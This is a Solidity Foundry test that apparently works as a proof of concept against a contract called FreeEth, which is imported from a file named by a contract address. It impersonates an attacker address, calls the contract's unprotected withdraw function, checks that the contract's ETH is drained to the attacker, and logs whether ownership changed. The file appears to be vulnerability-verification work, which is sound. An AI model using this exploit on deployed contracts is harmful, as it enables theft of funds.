// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol";

contract FreeEthTest is Test {
    FreeEth public freeEth;
    address public deployer;
    address public attacker = address(0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af);
    uint256 initialContractBalance = 1 ether;

    function setUp() public {
        deployer = address(this);
        freeEth = new FreeEth();
        
        // Fund contract with test ETH
        vm.deal(address(freeEth), initialContractBalance);
    }

    function testUnprotectedOwnerChange() public {
        // STEP 1: Get current owner BEFORE the attack
        address ownerBefore = freeEth.Owner();
        console2.log("--- BEFORE-Trigger Owner ---");
        console2.log("Current owner address: ", ownerBefore);
        
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 contractBalanceBefore = address(freeEth).balance;

        console2.log("--- Trigger withdraw by attacker ---");
        // Attacker exploits the unprotected withdrawal
        vm.prank(attacker);
        freeEth.withdraw();

        // STEP 2: Get current owner AFTER the attack
        address ownerAfter = freeEth.Owner();
        console2.log("--- AFTER-Trigger Owner ---");
        console2.log("Current owner address: ", ownerAfter);
        
        // Verify contract balance was drained
        assertEq(address(freeEth).balance, 0, "Contract balance should be 0");

        // Verify attacker received funds
        assertEq(attacker.balance, attackerBalanceBefore + contractBalanceBefore, "Attacker didn't receive funds");

        // Differential verification: Check owner state change
        if (ownerBefore != ownerAfter) {
            console2.log("Vulnerability Exists: Owner state changed from previous owner to attacker");
        } else {
            console2.log("Vulnerability not Exist: Owner state remains unchanged after attack");
        }
    }
}